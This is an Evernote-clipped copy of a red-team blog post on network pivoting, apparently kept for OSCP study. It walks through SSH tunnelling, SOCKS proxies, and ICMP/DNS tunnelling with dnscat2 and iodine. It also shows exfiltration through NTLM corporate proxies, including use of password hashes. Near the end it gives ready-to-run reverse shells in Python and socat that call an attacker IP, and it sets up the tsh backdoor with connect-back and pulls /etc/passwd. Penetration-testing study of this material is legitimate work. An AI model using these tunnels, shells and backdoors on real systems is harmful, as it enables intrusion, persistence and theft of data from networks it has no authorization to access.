@@ -1,0 +1,436 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/><meta name="exporter-version" content="Evernote Mac 6.13.1 (455785)"/><meta name="keywords" content="OSCP, Security"/><meta name="author" content="Anas"/><meta name="created" content="2018-01-08 16:28:19 +0000"/><meta name="source" content="Clearly"/><meta name="source-url" content="https://artkond.com/2017/03/23/pivoting-guide/"/><meta name="updated" content="2018-01-11 02:35:57 +0000"/><title>pivoting</title></head><body><div style="-evernote-webclip:true"><br/><div><div><div><div><h1>A Red Teamer's guide to pivoting</h1><div><div/></div></div>
+    
+    <p><span>Mar 23, 2017</span></p>
+  
+
+  
+    <p>Penetration testers often traverse logical network boundaries in order to gain access to client’s critical infrastracture. Common scenarios include developing the attack into the internal network after successful perimeter breach or gaining access to initialy unroutable network segments after compromising hosts inside the organization. Pivoting is a set of techniques used during red team/pentest engagements which make use of attacker-controlled hosts as logical network hops with the aim of amplifying network visibility. In this post I’ll cover common pivoting techniques and tools available. 
+</p>
+
+<h1>Contents</h1>
+
+
+
+<h2>Target with public IP</h2>
+
+<p>A prevalent scenario. Let’s say you find an RCE bug in a web-app accessible from the internet. You upload a shell and want to develop your attack into the internal network. Note that in this specific scenario you should able to bind ports on the compromised host and those ports should be accessible from the external network.</p>
+
+<h3>SSH port forwarding</h3>
+
+<p>Managed to find credentials to the SSH-service running on the host? Great! Connect to the host as follows:</p>
+
+<p><code>ssh username@host -D 1080</code></p>
+
+<p>This will spawn a socks server on the attacker’s side (ssh-client side).  Welcome to the intranet ;)  It is also possible to forward one specific port to a specific host. Let’s say you need to access an SMB share in the internal network on host 192.168.1.1.</p>
+
+<p><code>ssh username@host -L 445:192.168.1.1:445</code></p>
+
+<p>This way a port 445 will be opened on the attacker’s side. Note, that to bind privileged ports (such as 445) you will need root privileges on your machine.</p>
+
+<h4>VPN over SSH</h4>
+
+<p>Since openssh release 4.3 it is possible to tunnel layer 3 network traffic via an established ssh channel. This has an advantage over a typical tcp tunnel because you are in control of ip traffic. So, for example, you are able to perform SYN-scan with nmap and use your tools directly without resorting to <code>proxychains</code> or other proxifying tools. It’s done via the creation of <strong>tun</strong> devices on client and server side and transferring the data between them over ssh connection. This is quite simple, but you need root on both machines since the creation of tun devices is a privileged operation. These lines should be present in your <code>/etc/ssh/sshd_config</code> file (server-side):</p>
+
+<pre><code>PermitRootLogin yes
+PermitTunnel yes
+</code></pre>
+
+<p>The following command on the client will create a pair of tun devices on client and server:</p>
+
+<p><code>ssh username@server -w any:any</code></p>
+
+<p>The flag <code>-w</code> accepts the number of tun device on each side separated with a colon. It can be set explicitly - <code>-w 0:0</code> or you can use <code>-w any:any</code> syntax to take the next available tun device.</p>
+
+<p>The tunnel between the tun devices is enabled but the interfaces are yet to be configured. Example of configuring client-side:</p>
+
+<p><code>ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0</code></p>
+
+<p>Server-side:</p>
+
+<p><code>ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0</code></p>
+
+<p>Enable ip forwarding and NAT on the server:</p>
+
+<div><pre><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward
+iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
+</code></pre>
+</div>
+
+<p>Now you can make the peer host <code>1.1.1.1</code> your default gateway or route a specific host/network through it:</p>
+
+<p><code>route add -net 10.0.0.0/16 gw 1.1.1.1</code></p>
+
+<p>In this example the server’s external network interface is <code>eth0</code> and the newly created tun devices on both sides are <code>tun0</code>.</p>
+
+<h3>3proxy</h3>
+
+<p>Get it here - <a href="https://github.com/z3APA3A/3proxy/releases" target="_blank">https://github.com/z3APA3A/3proxy/releases</a>. This tools works for multiple platforms. There are pre-built binaries for Windows. As for Linux, you will need to build it yourself which is not a rocket science, just <code>./configure &amp;&amp; make</code> :) This tool is a swiss army knife in the proxy world so it has a ton of functionality. I usually use it either as a socks proxy or as a port forwarder.</p>
+
+<p>This tool gets all of its options from config file. To run it:</p>
+
+<p><code>3proxy.exe config_file</code></p>
+
+<p>or if you are on a Linux system:</p>
+
+<p><code>./3proxy config_file</code></p>
+
+<p>To run 3proxy as a socks5 proxy at port 1080 put the following line in the config:</p>
+
+<p><code>socks -p1080</code></p>
+
+<p>Now it’s possible to tunnel most of your pentesting tools through this proxy to develop the attack in the internal network. This is just a basic setup which is not very secure. You can play with options to place authentication and/or ip-based access control rules. Go check the full manual here - <a href="https://3proxy.ru/howtoe.asp" target="_blank">https://3proxy.ru/howtoe.asp</a>.
+To tunnel a specific port use the following syntax:</p>
+
+<p><code>tcppm &lt;localport&gt; &lt;targethost&gt; &lt;targetport&gt;</code></p>
+
+<h2>NAT scenario</h2>
+
+<p>This is by far the most common situation I encounter during engagements. The traffic to the target is being forwared on per-port basis. This means that all ports bound other than those being in the port forwarding rules won’t be accessible from outside. One possible solution is to initiate a reverse connection. The tools described below will help you with that.</p>
+
+<h3>SSH reverse port forwarding /w 3proxy</h3>
+
+<p>This pivoting setup looks something like this:</p>
+
+<p>Run 3proxy service with the following config on the target server:</p>
+
+<p><code>socks -p31337</code></p>
+
+<p>Create a separate user on the receiving side (attacker’s machine).</p>
+
+<p><code>adduser sshproxy</code></p>
+
+<p>This user has to be low-privileged and shouldn’t have shell privileges. After all, you don’t want to get reverse pentested, do ya? :) Edit /etc/passwd and switch shell to /bin/false. It should look like:</p>
+
+<div><pre><code>root:x:0:0:root:/root:/bin/bash
+...
+sshproxy:x:1000:1001:,,,:/home/sshproxy:/bin/false
+...
+</code></pre>
+</div>
+
+<p>Now connect to your server with the newly created user with <code>-R</code> flag. Linux system:</p>
+
+<p><code>ssh sshproxy@your_server -R 31337:127.0.0.1:31337</code></p>
+
+<p>For windows you will need to upload <a href="http://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html" target="_blank">plink.exe</a> first. This is a console version of putty. To run it:</p>
+
+<p><code>plink.exe sshproxy@your_server -R 31337:127.0.0.1:31337</code></p>
+
+<p>The <code>-R</code> flag allows you to bind port on the server side. All connections to this port will be relayed to a specified port on the client. This way we can run 3proxy socks service on the client side (compromised machine) and access this port on the attacker’s host via ssh <code>-R</code> flag.</p>
+
+<h3>Rpivot</h3>
+
+<p>This is my favorite method of traversing NAT connections. <a href="https://github.com/artkond/rpivot" target="_blank">Rpivot</a> is a reverse socks proxy tool that allows you to tunnel traffic via socks proxy. It connects back to your machine and binds a socks proxy on it. It works just like <code>ssh -D</code> but in opposite direction. Server side:</p>
+
+<p><code>python server.py --proxy-port 1080 --server-port 9999 --server-ip 0.0.0.0</code></p>
+
+<p>Client side:</p>
+
+<p><code>python client.py --server-ip &lt;ip&gt; --server-port 9999</code></p>
+
+<p>As a result, a socks4 proxy service will be bound server side on port 1080.</p>
+
+<h2>Exfiltrating from the internal network</h2>
+
+<p>Here’s a different case. Let’s say your social engineering gig ended up placing you in the internal network. You have limited connectivity and ability to execute command on the compromised machine.  Of course, if the internet is directly routed and not firewalled you can resort to any technique described above. But if you’re not so lucky there’re still ways to pivot your way out.</p>
+
+<h3>ICMP tunneling</h3>
+
+<p>If icmp traffic is allowed to external networks then most likely you can establish an icmp tunnel. The downside is that you will need root/administrator privileges on the target system becase of the necesity to use raw sockets. Check this tool out - <a href="http://code.gerade.org/hans/" target="_blank">http://code.gerade.org/hans/</a>. Personally I’ve never tried running it on Windows. It works like a charm on Linux tho. Server side command (attacker’s machine):</p>
+
+<p><code>./hans -v -f -s 1.1.1.1 -p P@ssw0rd</code></p>
+
+<p>The <code>-v</code> flag is for verbosity, the <code>-f</code> flag is to run in foreground and the <code>-s</code> flag’s value is the server’s ip on the newly created tun interface.</p>
+
+<p>Client side:</p>
+
+<p><code>./hans -f -c &lt;server_ip&gt; -p P@ssw0rd -v</code></p>
+
+<p>After successful connection the client should be directly visible at 1.1.1.100:</p>
+
+<div><pre><code># ping 1.1.1.100
+PING 1.1.1.100 (1.1.1.100) 56(84) bytes of data.
+64 bytes from 1.1.1.100: icmp_seq=1 ttl=65 time=42.9 ms
+</code></pre>
+</div>
+
+<p>Now you can use this machine as gate into the internal network. Use this machine a default gateway or connect to a management interface (ssh/tsh/web shell).</p>
+
+<h3>DNS tunneling</h3>
+
+<p>If any WAN traffic is blocked but external host names are resolved then there’s a possibility of tunneling traffic via DNS queries. You need a domain registered for this technique to work. <a href="http://dev.kryo.se/iodine/wiki/HowtoSetup" target="_blank">This manual</a> might help you with setting up your name server.</p>
+
+<h4>Iodine</h4>
+
+<p>If so happens that you got root access on the server you can try <a href="http://code.kryo.se/iodine/" target="_blank">iodine</a>. It works almost like hans icmp tunneling tool - it creates a pair of tun adapters and tunnels data between them as DNS queries. Server side:</p>
+
+<p><code>iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com</code></p>
+
+<p>Client side:</p>
+
+<p><code>iodine -f -P P@ssw0rd tunneldomain.com -r</code></p>
+
+<p>Successful connection will yield direct client visibility at address 1.1.1.2. Note, that this tunneling technique is quite slow. Your best bet is to use a compressed ssh connection over the resulting connection:</p>
+
+<p><code>ssh &lt;user&gt;@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080</code></p>
+
+<h4>Dnscat2</h4>
+
+<p><a href="https://github.com/iagox86/dnscat2" target="_blank">Dnscat2</a> establishes C&amp;C channel over recursive DNS queries. This tool doesn’t require root/administrator access (works both on windows and linux). It also supports port forwarding. Server side:</p>
+
+<div><pre><code>ruby ./dnscat2.rb tunneldomain.com
+</code></pre>
+</div>
+
+<p>Client side:</p>
+
+<p><code>./dnscat2 tunneldomain.com</code></p>
+
+<p>After you receive a connection of server side, you can view the active sessions with <code>windows</code> command:</p>
+
+<div><pre><code>dnscat2&gt; windows
+0 :: main [active]
+  dns1 :: DNS Driver running on 0.0.0.0:53 domains = tunneldomain.com [*]
+  1 :: command session (debian)
+  2 :: sh (debian) [*]
+</code></pre>
+</div>
+
+<p>To initiate port forwarding select a command session with <code>session -i &lt;num&gt;</code>:</p>
+
+<div><pre><code>dnscat2&gt; session -i 1
+New window created: 1
+New window created: 1
+history_size (session) =&gt; 1000
+This is a command session!
+
+That means you can enter a dnscat2 command such as
+'ping'! For a full list of clients, try 'help'.
+
+command session (debian) 1&gt;
+</code></pre>
+</div>
+
+<p>Use <code>listen [lhost:]lport rhost:rport</code> command to forward a port:</p>
+
+<p><code>command session (debian) 1&gt; listen 127.0.0.1:8080 10.0.0.20:80</code></p>
+
+<p>This will bind port 8080 on the attacker’s machine and forward all connections to 10.0.0.20:80.</p>
+
+<h3>Corporate HTTP proxy as a way out</h3>
+
+<p>HTTP proxies organization place for their employees to access external web-application present a good exfiltration opportunity given  you got the right credentials ;)</p>
+
+<h4>Rpivot</h4>
+
+<p>I already mentioned this tool in the NAT traversal section. It also supports connecting to the outside world via NTLM HTTP proxies. Server side command remains intact, use client-side command as follows:</p>
+
+<div><pre><code>python client.py --server-ip &lt;rpivot_server_ip&gt; --server-port 9999\
+--ntlm-proxy-ip &lt;proxy_ip&gt; --ntlm-proxy-port 8080 --domain CONTOSO.COM\
+--username Alice --password P@ssw0rd
+</code></pre>
+</div>
+
+<p>Or if you have LM:NT hashes instead of password:</p>
+
+<div><pre><code>python client.py --server-ip &lt;rpivot_server_ip&gt;\
+--server-port 9999 --ntlm-proxy-ip &lt;proxy_ip&gt; --ntlm-proxy-port 8080 --domain CONTOSO.COM\
+--username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
+</code></pre>
+</div>
+
+<h4>Cntlm</h4>
+
+<p><a href="http://cntlm.sourceforge.net/" target="_blank">Cntlm</a> is the tool of choice for running any non-proxy aware programs over NTLM-proxy. Basically this tool authenticates against a proxy and binds a port locally that is forwarded to the external service you specify. This port bound does not require any authentication so you can use your tools directly (putty/ssh for example). It uses a config file for its operation. Here’s a barebones config example to forward port 443 (this port is most likely to be allowed through the proxy):</p>
+
+<div><pre><code>Username Alice
+Password P@ssw0rd
+Domain CONTOSO.COM
+Proxy 10.0.0.10:8080
+Tunnel 2222:&lt;attackers_machine&gt;:443
+</code></pre>
+</div>
+
+<p>Run it:</p>
+
+<p><code>cntlm.exe -c config.conf</code></p>
+
+<p>Or if you’re on Linux:</p>
+
+<p><code>./cntlm -c config.conf</code></p>
+
+<p>Now, given you have ssh running on the remote host on port 443, you can launch ssh client (openssh/putty) and connect to local port 2222 to get access to the external machine.</p>
+
+<h4>OpenVpn over HTTP proxy</h4>
+
+<p><a href="https://openvpn.net/index.php/open-source/documentation/howto.html" target="_blank">OpenVpn</a> is huge so its configuration from the ground up is out of scope of this post. Just a quick mention - it also supports tunneling tcp connections over NTLM proxies. Add this line to your config file:</p>
+
+<p><code>http-proxy &lt;proxy_ip&gt; 8080 &lt;file_with_creds&gt; ntlm</code></p>
+
+<p>Credential file should contain username and password on separate lines. And, yes, you’ll need root.</p>
+
+<h2>Making use of SOCKS with proxychains</h2>
+
+<p>If your program doesn’t use raw sockets (nmap syn-scan, for example) then most probably you can use <code>proxychains</code> to force your program though the socks proxy. Edit proxy server in /etc/proxychains.conf:</p>
+
+<div><pre><code>[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks4  127.0.0.1 3128
+</code></pre>
+</div>
+
+<p>All ready. Just prepend <code>proxychains</code> to you favorite pwn tool:</p>
+
+<p><code>proxychains program_name</code></p>
+
+<p>Using impacket’s psexec.py with proxychains:</p>
+
+<p/><div><img src="pivoting.resources/7CF81A6E-1378-44C2-A285-1A674ACF71AC.png" height="472" width="576"/></div><p/>
+
+<h2>DNS with proxychains</h2>
+
+<p>Proxychains doesn’t follow socks RFC when it comes to resolving hostnames. It intercepts <code>gethostbyname</code> libc call and tunnels tcp DNS request through the socks proxy. The things is, the DNS server is hardcoded to <code>4.2.2.2</code>. You might want to change the nameserver in order to resolve names on the internal network. A typical scenario is to change the nameserver to domain controller if you are pentesting windows environment. The setup is located at <code>/usr/lib/proxychains3/proxyresolv</code>:</p>
+
+<div><pre><code>#!/bin/sh
+# This script is called by proxychains to resolve DNS names
+
+# DNS server used to resolve names
+DNS_SERVER=${PROXYRESOLV_DNS:-4.2.2.2}    #change nameserver here
+
+
+if [ $# = 0 ] ; then
+    echo "  usage:"
+    echo "      proxyresolv &lt;hostname&gt; "
+    exit
+fi
+</code></pre>
+</div>
+
+<h2>Beutifying your web shell</h2>
+
+<p>This section is not directly related to either pivoting or tunneling but instead describes a way of simplifying your work when developing attack into the internal network. Often, using a web-shell is rather tedious, especially when using programs that expect an interactive command interface. Most likely you will use some workarounds to performs simple tasks, such as passing password to sudo/su or just editing a file. I’m not a big fan of torturing myself, so when there’s an oportunity to escalate the web-shell to an interactive shell, I do so :) I won’t cover stuff like launching semi-interactive shell using bash/perl/python etc. There’s a ton of info on doing so. Check out this reverse shell cheat sheet - <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a>.</p>
+
+<h3>Python PTY shell</h3>
+
+<p>An upgrade from a regular semi-interactive shell. You can execute the following command in your existing shell:</p>
+
+<div><pre><code>python -c 'import pty; pty.spawn("/bin/bash")'
+</code></pre>
+</div>
+
+<p>Or initiate reverse connection:</p>
+
+<div><pre><code>python -c 'import socket,subprocess,os;\
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\
+s.connect(("&lt;attackers_ip&gt;",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);\
+os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+</code></pre>
+</div>
+
+<h3>Socat</h3>
+
+<p>Netcat on steroids! Seriously tho, go check this <a href="http://www.dest-unreach.org/socat/" target="_blank">tool’s</a> manual <code>man socat</code> and you’d be amazed what you can do with this tool regarding tunneling. Among other things it can spawn a fully interactive shell, even better than the aforementioned python-pty. The downside is that you most probably will have to build/install this tool on the target server as it is not a default utility in most unix-like distributions.</p>
+
+<h4>Bind shell</h4>
+
+<p>Set listener:</p>
+
+<p><code>socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane</code></p>
+
+<p>Connect to the listener:</p>
+
+<p><code>socat FILE:`tty`,raw,echo=0 TCP:&lt;victim_ip&gt;:1337</code></p>
+
+<h4>Reverse shell</h4>
+
+<p>Set listener:</p>
+
+<p><code>socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0</code></p>
+
+<p>Connect to attacker’s machine:</p>
+
+<div><pre><code>socat TCP4:&lt;attackers_ip&gt;:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
+</code></pre>
+</div>
+
+<h4>Terminal size</h4>
+
+<p>By default the terminal size is quite small, as you may notice when launching <code>top</code> command or editing files with a text editor. You can easily change this, use <code>stty -a </code> command to get the size of your regular teminal:</p>
+
+<div><pre><code>$ stty -a
+speed 38400 baud; rows 57; columns 211; line = 0;
+</code></pre>
+</div>
+
+<p>Apply desired size to your socat terminal:</p>
+
+<div><pre><code>$ stty rows 57 cols 211
+</code></pre>
+</div>
+
+<h3>Tsh</h3>
+
+<p><a href="https://github.com/creaktive/tsh" target="_blank">Tsh</a> is a small ssh-like backdoor with full-pty terminal and with capability of file transfer. This tool has very small footprint and is easily built on most unix-like systems. Start with editing tsh.h file:</p>
+
+<div><pre><code>#ifndef _TSH_H
+#define _TSH_H
+
+char *secret = "never say never say die";
+
+#define SERVER_PORT 22
+short int server_port = SERVER_PORT;
+/*
+#define CONNECT_BACK_HOST  "localhost"
+#define CONNECT_BACK_DELAY 30
+*/
+#define GET_FILE 1
+#define PUT_FILE 2
+#define RUNSHELL 3
+
+#endif /* tsh.h */</code></pre>
+</div>
+
+<p>Change <code>secret</code>, specify <code>SERVER_PORT</code>. Uncomment and edit <code>CONNECT_BACK_HOST</code> and <code>CONNECT_BACK_DELAY</code> directives if you want backconnect. Run make:</p>
+
+<div><pre><code>$ make linux_x64
+make								\
+	LDFLAGS=" -Xlinker --no-as-needed -lutil"	\
+	DEFS=" -DLINUX"					\
+	tsh tshd
+make[1]: Entering directory '/tmp/tsh'
+gcc -O3 -W -Wall -DLINUX -c pel.c
+gcc -O3 -W -Wall -DLINUX -c aes.c
+gcc -O3 -W -Wall -DLINUX -c sha1.c
+gcc -O3 -W -Wall -DLINUX -c tsh.c
+gcc -Xlinker --no-as-needed -lutil -o tsh pel.o aes.o sha1.o tsh.o
+strip tsh
+gcc -O3 -W -Wall -DLINUX -c tshd.c
+gcc -Xlinker --no-as-needed -lutil -o tshd pel.o aes.o sha1.o tshd.o
+strip tshd
+make[1]: Leaving directory '/tmp/tsh'
+</code></pre>
+</div>
+
+<p>Now run <code>./tshd</code> on server. It will start listening on the specified port. You can connect to it via executing the following command:</p>
+
+<p><code>./tsh host_ip</code></p>
+
+<p>If tsh was compiled with backconnect capability, the <code>tshd</code> daemon will try to connect back to the attacker’s machine. To launch listener on attacker’s side:</p>
+
+<div><pre><code>$ ./tsh cb
+Waiting for the server to connect...
+</code></pre>
+</div>
+<p>To transfer files with tsh:</p>
+
+<div><pre><code>./tsh host_ip get /etc/passwd .
+./tsh host_ip put /bin/netcat /tmp
+</code></pre>
+</div>
+
+
+  </div></div></div><br/></div></body></html>
